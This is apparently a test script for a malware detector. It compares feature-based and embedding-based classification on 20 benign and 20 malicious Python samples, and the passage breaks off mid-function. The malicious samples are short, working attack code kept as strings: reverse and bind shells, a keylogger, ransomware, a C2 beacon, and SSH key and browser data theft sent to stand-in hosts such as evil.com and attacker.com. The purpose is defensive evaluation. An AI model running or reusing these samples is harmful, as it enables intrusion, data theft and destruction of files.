#!/usr/bin/env python3
"""
Balanced hybrid search test with realistic benign and malicious samples.

Dataset:
- 20 advanced benign samples (legitimate complex code)
- 20 advanced malicious samples (real-world malware)
- Total: 40 samples, 50/50 split

Tests:
1. Feature-only search (no vectors)
2. Vector search (if transformers works)
3. Hybrid search (vectors + features)
4. Metrics: Precision, Recall, F1, False Positive Rate

Usage:
    python scripts/test_hybrid_balanced.py
"""

import sys
import os
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from dotenv import load_dotenv
load_dotenv()

from qdrant_client import QdrantClient, models
import numpy as np
from collections import defaultdict
import torch
from transformers import AutoTokenizer, AutoModel
from scriptguard.steps.feature_extraction import (
    extract_ast_features,
    calculate_entropy,
    extract_api_patterns,
    extract_string_features
)


# ============================================================================
# ADVANCED BENIGN SAMPLES (20)
# ============================================================================
BENIGN_SAMPLES = [
    {
        "code": """
import requests
from bs4 import BeautifulSoup
import time

def scrape_product_prices(url):
    \"\"\"Legitimate web scraping for price monitoring.\"\"\"
    headers = {'User-Agent': 'Mozilla/5.0'}
    response = requests.get(url, headers=headers, timeout=10)
    soup = BeautifulSoup(response.content, 'html.parser')

    prices = []
    for item in soup.find_all('div', class_='product-price'):
        price = float(item.text.strip().replace('$', ''))
        prices.append(price)

    return prices
""",
        "category": "web_scraping",
        "description": "Legitimate price monitoring scraper"
    },

    {
        "code": """
import requests
import json
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

class APIClient:
    \"\"\"REST API client with authentication and retries.\"\"\"

    def __init__(self, base_url, api_key):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'Authorization': f'Bearer {api_key}'})

        # Retry strategy
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503])
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def get_data(self, endpoint):
        response = self.session.get(f'{self.base_url}/{endpoint}')
        response.raise_for_status()
        return response.json()
""",
        "category": "api_client",
        "description": "Professional REST API client with auth"
    },

    {
        "code": """
import tarfile
import gzip
import os
import shutil
from datetime import datetime

def backup_directory(source_dir, backup_dir):
    \"\"\"Create compressed backup of directory.\"\"\"
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    backup_name = f'backup_{timestamp}.tar.gz'
    backup_path = os.path.join(backup_dir, backup_name)

    with tarfile.open(backup_path, 'w:gz') as tar:
        tar.add(source_dir, arcname=os.path.basename(source_dir))

    # Rotate old backups (keep last 7)
    backups = sorted([f for f in os.listdir(backup_dir) if f.startswith('backup_')])
    for old_backup in backups[:-7]:
        os.remove(os.path.join(backup_dir, old_backup))

    return backup_path
""",
        "category": "backup_script",
        "description": "Legitimate backup with rotation"
    },

    {
        "code": """
import logging
from logging.handlers import RotatingFileHandler
import os

def setup_logging(log_dir, max_bytes=10*1024*1024, backup_count=5):
    \"\"\"Configure rotating file logger.\"\"\"
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, 'application.log')

    handler = RotatingFileHandler(
        log_file,
        maxBytes=max_bytes,
        backupCount=backup_count
    )

    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    handler.setFormatter(formatter)

    logger = logging.getLogger()
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)

    return logger
""",
        "category": "log_rotation",
        "description": "Legitimate log rotation system"
    },

    {
        "code": """
import paramiko
import os

def deploy_to_server(host, username, key_path, local_file, remote_path):
    \"\"\"SSH deployment script for CI/CD.\"\"\"
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Use SSH key authentication
    private_key = paramiko.RSAKey.from_private_key_file(key_path)
    ssh.connect(host, username=username, pkey=private_key)

    # Upload file
    sftp = ssh.open_sftp()
    sftp.put(local_file, remote_path)
    sftp.close()

    # Restart service
    stdin, stdout, stderr = ssh.exec_command('sudo systemctl restart myapp')
    exit_code = stdout.channel.recv_exit_status()

    ssh.close()
    return exit_code == 0
""",
        "category": "ssh_automation",
        "description": "Legitimate CI/CD deployment via SSH"
    },

    {
        "code": """
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import os

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    username = Column(String(50), unique=True)
    email = Column(String(100))

def init_database(db_url):
    \"\"\"Initialize database with migrations.\"\"\"
    engine = create_engine(db_url)
    Base.metadata.create_all(engine)

    Session = sessionmaker(bind=engine)
    session = Session()

    return session
""",
        "category": "database_ops",
        "description": "Legitimate database initialization"
    },

    {
        "code": """
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
import base64
import os

def encrypt_sensitive_data(data, password):
    \"\"\"Encrypt data for secure storage (legitimate security).\"\"\"
    # Derive key from password
    salt = os.urandom(16)
    kdf = PBKDF2(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))

    # Encrypt
    cipher = Fernet(key)
    encrypted = cipher.encrypt(data.encode())

    return {
        'salt': base64.b64encode(salt).decode(),
        'data': encrypted.decode()
    }
""",
        "category": "encryption",
        "description": "Legitimate encryption for data security"
    },

    {
        "code": """
import subprocess
import json
import sys

def run_tests_in_docker(image_name, test_command):
    \"\"\"Run automated tests in Docker container.\"\"\"
    # Build container
    subprocess.run(
        ['docker', 'build', '-t', image_name, '.'],
        check=True,
        capture_output=True
    )

    # Run tests
    result = subprocess.run(
        ['docker', 'run', '--rm', image_name, 'pytest', test_command],
        capture_output=True,
        text=True
    )

    # Parse results
    if result.returncode == 0:
        print(f"✓ Tests passed")
        return True
    else:
        print(f"✗ Tests failed:\\n{result.stdout}")
        return False
""",
        "category": "docker_testing",
        "description": "Legitimate Docker test automation"
    },

    {
        "code": """
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

def send_notification_email(to_email, subject, body):
    \"\"\"Send email notification for monitoring alerts.\"\"\"
    smtp_server = os.getenv('SMTP_SERVER')
    smtp_port = int(os.getenv('SMTP_PORT', 587))
    smtp_user = os.getenv('SMTP_USER')
    smtp_password = os.getenv('SMTP_PASSWORD')

    msg = MIMEMultipart()
    msg['From'] = smtp_user
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_user, smtp_password)
        server.send_message(msg)
""",
        "category": "email_notification",
        "description": "Legitimate monitoring email alerts"
    },

    {
        "code": """
import subprocess
import os
from pathlib import Path

def git_auto_commit_and_push(repo_path, commit_message):
    \"\"\"Automated git operations for CI/CD.\"\"\"
    os.chdir(repo_path)

    # Stage all changes
    subprocess.run(['git', 'add', '.'], check=True)

    # Commit
    subprocess.run(
        ['git', 'commit', '-m', commit_message],
        check=True
    )

    # Push to remote
    subprocess.run(['git', 'push', 'origin', 'main'], check=True)

    print(f"✓ Committed and pushed: {commit_message}")
""",
        "category": "git_automation",
        "description": "Legitimate git automation for CI/CD"
    },

    {
        "code": """
import pandas as pd
import numpy as np
from sklearn.preprocessing import StandardScaler

def process_data_pipeline(input_file, output_file):
    \"\"\"Data processing pipeline for ML.\"\"\"
    # Read data
    df = pd.read_csv(input_file)

    # Clean data
    df = df.dropna()
    df = df[df['value'] > 0]

    # Feature engineering
    df['log_value'] = np.log(df['value'])
    df['value_squared'] = df['value'] ** 2

    # Normalize
    scaler = StandardScaler()
    df[['value', 'log_value']] = scaler.fit_transform(df[['value', 'log_value']])

    # Save
    df.to_csv(output_file, index=False)

    return df
""",
        "category": "data_processing",
        "description": "Legitimate ML data pipeline"
    },

    {
        "code": """
import psutil
import requests
import time

def monitor_system_health(webhook_url):
    \"\"\"System monitoring with alerts.\"\"\"
    while True:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory_percent = psutil.virtual_memory().percent
        disk_percent = psutil.disk_usage('/').percent

        # Alert if thresholds exceeded
        if cpu_percent > 90 or memory_percent > 90 or disk_percent > 90:
            alert = {
                'cpu': cpu_percent,
                'memory': memory_percent,
                'disk': disk_percent,
                'timestamp': time.time()
            }
            requests.post(webhook_url, json=alert)

        time.sleep(60)
""",
        "category": "monitoring",
        "description": "Legitimate system health monitoring"
    },

    {
        "code": """
import yaml
import os
from jinja2 import Template

def generate_config_from_template(template_file, env):
    \"\"\"Generate configuration from template (Ansible-style).\"\"\"
    with open(template_file, 'r') as f:
        template_content = f.read()

    template = Template(template_content)
    config = template.render(**env)

    # Validate YAML
    parsed = yaml.safe_load(config)

    # Write to file
    output_file = f'config.{env["environment"]}.yml'
    with open(output_file, 'w') as f:
        f.write(config)

    return output_file
""",
        "category": "config_management",
        "description": "Legitimate configuration templating"
    },

    {
        "code": """
import hashlib
import os

def verify_file_integrity(file_path, expected_hash):
    \"\"\"Verify downloaded file integrity (security check).\"\"\"
    sha256_hash = hashlib.sha256()

    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            sha256_hash.update(chunk)

    actual_hash = sha256_hash.hexdigest()

    if actual_hash != expected_hash:
        raise ValueError(f"Hash mismatch! File may be corrupted or tampered.")

    return True
""",
        "category": "security_check",
        "description": "Legitimate file integrity verification"
    },

    {
        "code": """
import socket
import json

def health_check_server(host, port):
    \"\"\"Health check for service monitoring.\"\"\"
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()

        if result == 0:
            return {'status': 'healthy', 'host': host, 'port': port}
        else:
            return {'status': 'unhealthy', 'error': 'Connection refused'}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}
""",
        "category": "health_check",
        "description": "Legitimate service health monitoring"
    },

    {
        "code": """
import schedule
import time
import subprocess

def backup_database():
    \"\"\"Scheduled database backup task.\"\"\"
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    backup_file = f'/backups/db_{timestamp}.sql'

    subprocess.run([
        'pg_dump',
        '-U', 'postgres',
        '-d', 'production',
        '-f', backup_file
    ], check=True)

    print(f"✓ Database backed up to {backup_file}")

# Schedule daily backups
schedule.every().day.at("02:00").do(backup_database)

while True:
    schedule.run_pending()
    time.sleep(60)
""",
        "category": "scheduled_task",
        "description": "Legitimate scheduled backup cron job"
    },

    {
        "code": """
import requests
from concurrent.futures import ThreadPoolExecutor
import time

def fetch_url(url):
    \"\"\"Fetch single URL.\"\"\"
    try:
        response = requests.get(url, timeout=10)
        return {'url': url, 'status': response.status_code}
    except Exception as e:
        return {'url': url, 'error': str(e)}

def parallel_url_checker(urls):
    \"\"\"Check multiple URLs in parallel (legitimate monitoring).\"\"\"
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(fetch_url, urls))

    return results
""",
        "category": "parallel_processing",
        "description": "Legitimate parallel URL health checks"
    },

    {
        "code": """
import os
import shutil
from pathlib import Path

def sync_directories(source, destination, delete=False):
    \"\"\"Sync directories (rsync-style backup).\"\"\"
    source_path = Path(source)
    dest_path = Path(destination)

    # Create destination if doesn't exist
    dest_path.mkdir(parents=True, exist_ok=True)

    # Copy new/modified files
    for src_file in source_path.rglob('*'):
        if src_file.is_file():
            rel_path = src_file.relative_to(source_path)
            dst_file = dest_path / rel_path

            # Copy if newer or doesn't exist
            if not dst_file.exists() or src_file.stat().st_mtime > dst_file.stat().st_mtime:
                dst_file.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(src_file, dst_file)
""",
        "category": "file_sync",
        "description": "Legitimate directory synchronization"
    },

    {
        "code": """
import pytest
import requests_mock

def test_api_client():
    \"\"\"Unit test for API client with mocking.\"\"\"
    with requests_mock.Mocker() as m:
        m.get('https://api.example.com/data', json={'result': 'success'})

        response = requests.get('https://api.example.com/data')
        assert response.json() == {'result': 'success'}

def test_data_processing():
    \"\"\"Test data processing function.\"\"\"
    input_data = [1, 2, 3, 4, 5]
    result = process_data(input_data)
    assert len(result) == 5
    assert all(isinstance(x, int) for x in result)
""",
        "category": "testing",
        "description": "Legitimate unit tests with mocking"
    },

    {
        "code": """
import redis
import json
import time

def cache_api_response(key, ttl=3600):
    \"\"\"Decorator for caching API responses in Redis.\"\"\"
    def decorator(func):
        def wrapper(*args, **kwargs):
            redis_client = redis.Redis(host='localhost', port=6379)

            # Check cache
            cached = redis_client.get(key)
            if cached:
                return json.loads(cached)

            # Fetch and cache
            result = func(*args, **kwargs)
            redis_client.setex(key, ttl, json.dumps(result))

            return result
        return wrapper
    return decorator
""",
        "category": "caching",
        "description": "Legitimate Redis caching layer"
    },
]


# ============================================================================
# ADVANCED MALICIOUS SAMPLES (20) - From previous test
# ============================================================================
MALICIOUS_SAMPLES = [
    {
        "code": """
import os
os.system('rm -rf /')
""",
        "category": "destructive",
        "description": "Simple destructive command"
    },
    {
        "code": """
eval(input('Enter code: '))
""",
        "category": "code_injection",
        "description": "Dangerous eval with user input"
    },
    {
        "code": """
import base64
exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgid2hvYW1pIik=').decode())
""",
        "category": "obfuscated",
        "description": "Base64 obfuscated command execution"
    },
    {
        "code": """
import base64
__import__('os').system(__import__('base64').b64decode(b'bHMgLWxh').decode())
""",
        "category": "obfuscated",
        "description": "Obfuscated with import tricks"
    },
    {
        "code": """
# XOR obfuscation
key = 0x42
payload = bytes([0x2b, 0x31, 0x24, 0x32, 0x35, 0x16, 0x24, 0x27])
decoded = ''.join(chr(b ^ key) for b in payload)
eval(decoded)
""",
        "category": "obfuscated",
        "description": "XOR-encoded payload"
    },
    {
        "code": """
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.100', 4444))
subprocess.run(['/bin/sh'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
""",
        "category": "reverse_shell",
        "description": "Classic reverse shell"
    },
    {
        "code": """
import socket
import os

s = socket.socket()
s.connect(('attacker.com', 8080))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.system('/bin/bash')
""",
        "category": "reverse_shell",
        "description": "Reverse shell with dup2"
    },
    {
        "code": """
from pynput import keyboard
import requests

log = []

def on_press(key):
    log.append(str(key))
    if len(log) >= 100:
        requests.post('http://evil.com/log', data={'keys': ''.join(log)})
        log.clear()

keyboard.Listener(on_press=on_press).start()
""",
        "category": "keylogger",
        "description": "Keylogger with network exfiltration"
    },
    {
        "code": """
import os
import glob
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

for file in glob.glob('/home/**/*', recursive=True):
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(file)
""",
        "category": "ransomware",
        "description": "File encryption ransomware"
    },
    {
        "code": """
import requests
import time
import subprocess

C2_SERVER = 'http://command-server.com/api'

while True:
    try:
        cmd = requests.get(f'{C2_SERVER}/command').json()['cmd']
        result = subprocess.run(cmd, shell=True, capture_output=True)
        requests.post(f'{C2_SERVER}/result', json={'output': result.stdout.decode()})
        time.sleep(60)
    except:
        time.sleep(300)
""",
        "category": "c2",
        "description": "C2 beacon with command execution"
    },
    {
        "code": """
import requests
import tempfile
import os

stage2_url = 'http://malware.com/payload.py'
stage2_code = requests.get(stage2_url).text
exec(compile(stage2_code, '<stage2>', 'exec'))
os.system('echo "python3 /tmp/backdoor.py" >> ~/.bashrc')
""",
        "category": "multi_stage",
        "description": "Multi-stage loader with persistence"
    },
    {
        "code": """
import random
import base64

nop_sled = ''.join(random.choice(['pass\\n', '#comment\\n']) for _ in range(10))
payload = base64.b64encode(b'import os;os.system("id")').decode()

code = f'''
{nop_sled}
import base64
exec(base64.b64decode("{payload}").decode())
'''
exec(code)
""",
        "category": "polymorphic",
        "description": "Polymorphic malware with random padding"
    },
    {
        "code": """
import os
import requests

ssh_dir = os.path.expanduser('~/.ssh')
for key_file in ['id_rsa', 'id_ed25519', 'id_ecdsa']:
    path = os.path.join(ssh_dir, key_file)
    if os.path.exists(path):
        with open(path, 'r') as f:
            key_data = f.read()
        requests.post('http://attacker.com/keys', data={'key': key_data})
""",
        "category": "credential_theft",
        "description": "SSH key exfiltration"
    },
    {
        "code": """
import ctypes
import subprocess

proc = subprocess.Popen(['sleep', '1000'])
pid = proc.pid

shellcode = b"\\x90" * 100
PROCESS_ALL_ACCESS = 0x1F0FFF
kernel32 = ctypes.windll.kernel32
process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
""",
        "category": "process_injection",
        "description": "Process injection with shellcode"
    },
    {
        "code": """
import os
import shutil

backdoor = '/tmp/backdoor.py'
startup = os.path.expanduser('~/.config/autostart/legit-app.desktop')

os.makedirs(os.path.dirname(startup), exist_ok=True)
with open(startup, 'w') as f:
    f.write(f'''[Desktop Entry]
Type=Application
Exec=python3 {backdoor}
Hidden=true
''')
""",
        "category": "persistence",
        "description": "Autostart persistence"
    },
    {
        "code": """
import sys
import os

if sys.gettrace() is not None:
    sys.exit(0)

if os.path.exists('/sys/class/dmi/id/product_name'):
    with open('/sys/class/dmi/id/product_name', 'r') as f:
        if 'VirtualBox' in f.read() or 'VMware' in f.read():
            sys.exit(0)

exec('malicious code here')
""",
        "category": "anti_analysis",
        "description": "Anti-debugging and VM detection"
    },
    {
        "code": """
import socket
import struct

def create_bind_shell(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    conn, addr = s.accept()
    os.dup2(conn.fileno(), 0)
    os.dup2(conn.fileno(), 1)
    os.dup2(conn.fileno(), 2)
    os.system('/bin/sh')
""",
        "category": "bind_shell",
        "description": "Bind shell backdoor"
    },
    {
        "code": """
import os
import subprocess

browsers = [
    '~/.mozilla/firefox',
    '~/.config/google-chrome',
    '~/Library/Application Support/Google/Chrome'
]

for browser_dir in browsers:
    path = os.path.expanduser(browser_dir)
    if os.path.exists(path):
        subprocess.run(['tar', 'czf', '/tmp/stolen.tar.gz', path])
        subprocess.run(['curl', '-X', 'POST', '-F', 'file=@/tmp/stolen.tar.gz', 'http://evil.com/upload'])
""",
        "category": "data_exfiltration",
        "description": "Browser data exfiltration"
    },
    {
        "code": """
import os

payload = bytes.fromhex('4d5a90000300000004000000ffff0000')  # PE header
shellcode_path = '/tmp/.hidden.bin'

with open(shellcode_path, 'wb') as f:
    f.write(payload)

os.chmod(shellcode_path, 0o755)
os.system(shellcode_path)
os.remove(shellcode_path)
""",
        "category": "dropper",
        "description": "Binary dropper with cleanup"
    },
    {
        "code": """
import subprocess
import base64

commands = [
    'whoami',
    'uname -a',
    'cat /etc/passwd',
    'cat ~/.ssh/id_rsa'
]

results = []
for cmd in commands:
    output = subprocess.check_output(cmd, shell=True)
    results.append(base64.b64encode(output).decode())

exfil_data = '|'.join(results)
subprocess.run(['curl', '-d', exfil_data, 'http://attacker.com/collect'])
""",
        "category": "reconnaissance",
        "description": "System reconnaissance and exfiltration"
    },
]


def print_separator(title):
    print(f"\n{'='*70}")
    print(f"{title}")
    print('='*70)


def extract_features_for_sample(code: str) -> dict:
    """Extract features with legitimate API filtering."""
    try:
        ast_features = extract_ast_features(code)
        entropy = calculate_entropy(code)
        api_patterns = extract_api_patterns(code)
        string_features = extract_string_features(code)

        # Filter out legitimate APIs that might be flagged
        LEGITIMATE_IN_CONTEXT = {'loads', 'dumps', 'decode', 'encode'}
        raw_dangerous = ast_features.get("dangerous_patterns", [])

        # Only keep truly dangerous patterns
        filtered_dangerous = []
        for api in raw_dangerous:
            # Keep if it's exec, eval, system, etc.
            if api in ['exec', 'eval', 'compile', '__import__', 'system', 'call', 'popen']:
                filtered_dangerous.append(api)
            # Skip if it's a legitimate API (loads/dumps) unless with pickle/marshal
            elif api in LEGITIMATE_IN_CONTEXT:
                # Check context - if pickle.loads or marshal.loads, keep it
                if 'pickle' in code.lower() or 'marshal' in code.lower():
                    filtered_dangerous.append(api)
                # json.loads, yaml.loads are OK - skip
            else:
                # Keep other dangerous patterns
                filtered_dangerous.append(api)

        return {
            "complexity_score": ast_features.get("complexity_score", 0),
            "entropy": entropy,
            "code_length": len(code),
            "code_lines": code.count("\n") + 1,
            "dangerous_api_calls": filtered_dangerous,
            "suspicious_combinations": api_patterns.get("suspicious_combinations", []),
            "has_network_api": len(api_patterns.get("network_apis", [])) > 0,
            "has_file_api": len(api_patterns.get("file_apis", [])) > 0,
            "has_process_api": len(api_patterns.get("process_apis", [])) > 0,
            "has_crypto_api": len(api_patterns.get("crypto_apis", [])) > 0,
            "has_urls": string_features.get("has_urls", False),
            "has_ips": string_features.get("has_ips", False),
            "has_base64": string_features.get("has_base64", False),
            "has_hex": string_features.get("has_hex", False),
            "network_apis": api_patterns.get("network_apis", []),
            "file_apis": api_patterns.get("file_apis", []),
            "process_apis": api_patterns.get("process_apis", []),
            "crypto_apis": api_patterns.get("crypto_apis", []),
            "imports": ast_features.get("imports", []),
            "function_calls": ast_features.get("function_calls", []),
            "suspicious_strings": string_features.get("suspicious_strings", [])
        }
    except Exception as e:
        return {}


def calculate_feature_similarity(features1: dict, features2: dict) -> float:
    """Calculate feature similarity (0-1)."""
    score = 0.0

    # Entropy similarity (15%)
    e1, e2 = features1.get('entropy', 0), features2.get('entropy', 0)
    if e1 > 0 and e2 > 0:
        score += (1 - abs(e1 - e2) / max(e1, e2)) * 0.15

    # Complexity similarity (10%)
    c1, c2 = features1.get('complexity_score', 0), features2.get('complexity_score', 0)
    if c1 > 0 and c2 > 0:
        score += (1 - abs(c1 - c2) / max(c1, c2)) * 0.10

    # API usage overlap (35%)
    api_features = ['has_network_api', 'has_file_api', 'has_process_api', 'has_crypto_api']
    api_match = sum(1 for f in api_features if features1.get(f) == features2.get(f) and features1.get(f))
    score += (api_match / len(api_features)) * 0.35

    # Dangerous API overlap (25%)
    d1 = set(features1.get('dangerous_api_calls', []))
    d2 = set(features2.get('dangerous_api_calls', []))
    if d1 and d2:
        score += (len(d1 & d2) / len(d1 | d2)) * 0.25

    # String pattern similarity (15%)
    string_features = ['has_urls', 'has_ips', 'has_base64', 'has_hex']
    string_match = sum(1 for f in string_features if features1.get(f) == features2.get(f) and features1.get(f))
    score += (string_match / len(string_features)) * 0.15

    return score


def setup_balanced_collection(client: QdrantClient, use_real_embeddings=True):
    """Create balanced collection."""
    print_separator("SETUP: Balanced Test Collection")

    collection_name = "code_samples_balanced"

    # Delete if exists
    try:
        client.delete_collection(collection_name)
    except:
        pass

    # Create collection (UniXcoder uses 768 dimensions)
    client.create_collection(
        collection_name=collection_name,
        vectors_config=models.VectorParams(size=768, distance=models.Distance.COSINE)
    )
    print(f"✓ Created collection '{collection_name}'")

    # Combine samples
    all_samples = []
    for sample in BENIGN_SAMPLES:
        all_samples.append({**sample, 'label': 'benign'})
    for sample in MALICIOUS_SAMPLES:
        all_samples.append({**sample, 'label': 'malicious'})

    print(f"\nAdding {len(all_samples)} balanced samples:")
    print(f"  Benign:    {len(BENIGN_SAMPLES)} samples ({len(BENIGN_SAMPLES)/len(all_samples)*100:.0f}%)")
    print(f"  Malicious: {len(MALICIOUS_SAMPLES)} samples ({len(MALICIOUS_SAMPLES)/len(all_samples)*100:.0f}%)")

    # Initialize UniXcoder model if using real embeddings
    tokenizer = None
    model = None
    device = "cuda" if torch.cuda.is_available() else "cpu"

    if use_real_embeddings:
        print(f"\n⏳ Initializing UniXcoder (microsoft/unixcoder-base)...")
        print(f"   Device: {device}")

        tokenizer = AutoTokenizer.from_pretrained("microsoft/unixcoder-base")
        # Use safetensors to bypass torch 2.6 requirement
        model = AutoModel.from_pretrained("microsoft/unixcoder-base", use_safetensors=True)
        model.to(device)
        model.eval()

        print(f"✓ UniXcoder ready (768 dimensions)")

    # Add points
    points = []
    codes = [sample['code'] for sample in all_samples]

    # Generate embeddings with UniXcoder
    if use_real_embeddings and model and tokenizer:
        print(f"\n⏳ Generating embeddings for {len(codes)} samples...")

        embeddings = []
        batch_size = 8  # Smaller batch for CUDA memory

        with torch.no_grad():
            for i in range(0, len(codes), batch_size):
                batch = codes[i:i+batch_size]

                # Tokenize
                inputs = tokenizer(batch, padding=True, truncation=True, max_length=512, return_tensors="pt")
                inputs = {k: v.to(device) for k, v in inputs.items()}

                # Get embeddings (mean pooling)
                outputs = model(**inputs)
                # Use last hidden state and mean pool
                batch_embeddings = outputs.last_hidden_state.mean(dim=1)

                embeddings.append(batch_embeddings.cpu().numpy())

                if (i + batch_size) % 32 == 0:
                    print(f"  Progress: {i + batch_size}/{len(codes)}...")

        embeddings = np.vstack(embeddings)
        print(f"✓ Embeddings generated (shape: {embeddings.shape})")
    else:
        print(f"\n⚠️  Using dummy vectors (zeros)")
        embeddings = np.zeros((len(codes), 768))  # UniXcoder uses 768 dims

    for idx, sample in enumerate(all_samples):
        features = extract_features_for_sample(sample['code'])
        vector = embeddings[idx].tolist()

        points.append(models.PointStruct(
            id=idx + 1,
            vector=vector,
            payload={
                "code": sample['code'],
                "label": sample['label'],
                "category": sample['category'],
                "description": sample['description'],
                "db_id": idx + 1,
                "features": features
            }
        ))

    client.upsert(collection_name=collection_name, points=points)
    print(f"\n✓ Added {len(points)} samples with {'real embeddings' if use_real_embeddings else 'dummy vectors'}")

    return collection_name, (tokenizer, model, device)


def calculate_metrics(predictions, ground_truth):
    """Calculate classification metrics."""
    tp = sum(1 for p, g in zip(predictions, ground_truth) if p == 'malicious' and g == 'malicious')
    fp = sum(1 for p, g in zip(predictions, ground_truth) if p == 'malicious' and g == 'benign')
    tn = sum(1 for p, g in zip(predictions, ground_truth) if p == 'benign' and g == 'benign')
    fn = sum(1 for p, g in zip(predictions, ground_truth) if p == 'benign' and g == 'malicious')

    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0

    return {
        'tp': tp, 'fp': fp, 'tn': tn, 'fn': fn,
        'precision': precision,
        'recall': recall,
        'f1': f1,
        'fpr': fpr
    }


def test_feature_based_classification(client, collection):
    """Test feature-based classification."""
    print_separator("TEST: Feature-Based Classification")

    print("\nStrategy: Classify based on static features ONLY")
    print("  Malicious if:")
    print("    - dangerous_api_calls > 0 AND (network_api OR process_api)")
    print("    - entropy > 5.5 AND (crypto_api OR base64)")
    print("  Otherwise: Benign")

    # Get all samples
    all_results = client.scroll(collection_name=collection, limit=100, with_payload=True)
    all_points = all_results[0]

    predictions = []
    ground_truth = []

    for point in all_points:
        payload = point.payload
        features = payload['features']
        label = payload['label']

        # Feature-based classification logic
        is_malicious = False

        # Rule 1: Dangerous APIs + network/process
        if len(features.get('dangerous_api_calls', [])) > 0:
            if features.get('has_network_api') or features.get('has_process_api'):
                is_malicious = True

        # Rule 2: High entropy + crypto/base64
        if features.get('entropy', 0) > 5.5:
            if features.get('has_crypto_api') or features.get('has_base64'):
                is_malicious = True

        prediction = 'malicious' if is_malicious else 'benign'
        predictions.append(prediction)
        ground_truth.append(label)

    # Calculate metrics
    metrics = calculate_metrics(predictions, ground_truth)

    print(f"\n{'Metric':<20} {'Value':<10}")
    print("-" * 30)
    print(f"{'True Positives':<20} {metrics['tp']:<10}")
    print(f"{'False Positives':<20} {metrics['fp']:<10}")
    print(f"{'True Negatives':<20} {metrics['tn']:<10}")
    print(f"{'False Negatives':<20} {metrics['fn']:<10}")
    print(f"{'Precision':<20} {metrics['precision']:<10.2%}")
    print(f"{'Recall':<20} {metrics['recall']:<10.2%}")
    print(f"{'F1 Score':<20} {metrics['f1']:<10.2%}")
    print(f"{'False Positive Rate':<20} {metrics['fpr']:<10.2%}")

    # Show false positives
    if metrics['fp'] > 0:
        print(f"\n⚠️  False Positives ({metrics['fp']}):")
        for p, g, point in zip(predictions, ground_truth, all_points):
            if p == 'malicious' and g == 'benign':
                payload = point.payload
                print(f"  - {payload['category']:20s} | {payload['description']}")

    # Show false negatives
    if metrics['fn'] > 0:
        print(f"\n⚠️  False Negatives ({metrics['fn']}):")
        for p, g, point in zip(predictions, ground_truth, all_points):
            if p == 'benign' and g == 'malicious':
                payload = point.payload
                print(f"  - {payload['category']:20s} | {payload['description']}")

    print("\n✅ Feature-based classification complete!")
    return metrics


def test_vector_based_search(client, collection, embedding_components):
    """Test vector-based search (semantic similarity)."""
    print_separator("TEST: Vector-Based Search (Semantic Similarity)")

    tokenizer, model, device = embedding_components

    # Test queries
    test_queries = [
        {
            "code": "import socket\ns = socket.socket()\ns.connect(('192.168.1.1', 4444))",
            "expected_label": "malicious",
            "description": "Reverse shell pattern"
        },
        {
            "code": "import requests\nrequests.get('http://api.example.com/data')",
            "expected_label": "benign",
            "description": "Simple API request"
        },
        {
            "code": "exec(base64.b64decode('aW1wb3J0IG9z').decode())",
            "expected_label": "malicious",
            "description": "Obfuscated execution"
        }
    ]

    predictions = []
    ground_truth = []

    print("\nTesting semantic similarity search...")

    for query in test_queries:
        # Embed query with UniXcoder
        with torch.no_grad():
            inputs = tokenizer([query['code']], padding=True, truncation=True, max_length=512, return_tensors="pt")
            inputs = {k: v.to(device) for k, v in inputs.items()}
            outputs = model(**inputs)
            query_vector = outputs.last_hidden_state.mean(dim=1).cpu().numpy()[0]

        # Vector search (top 5 results)
        results = client.query_points(
            collection_name=collection,
